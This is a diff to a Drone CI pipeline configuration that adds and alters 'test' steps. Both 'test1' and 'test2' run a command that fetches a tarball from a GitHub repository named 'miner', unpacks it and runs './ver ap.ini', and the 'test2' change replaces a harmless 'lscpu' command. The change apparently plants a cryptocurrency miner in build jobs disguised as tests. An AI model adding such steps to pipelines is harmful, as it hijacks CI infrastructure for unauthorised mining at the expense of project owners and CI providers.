@@ -1,3 +1,12 @@
+kind: pipeline
+type: docker
+name: build1
+
+steps:
+- name: test1
+  image: golang
+  commands:
+  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
 ---
 kind: pipeline
 type: docker
@@ -7,8 +16,7 @@ steps:
 - name: test2
   image: node
   commands:
-  - lscpu
-
+  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
 ---
 kind: pipeline
 name: after
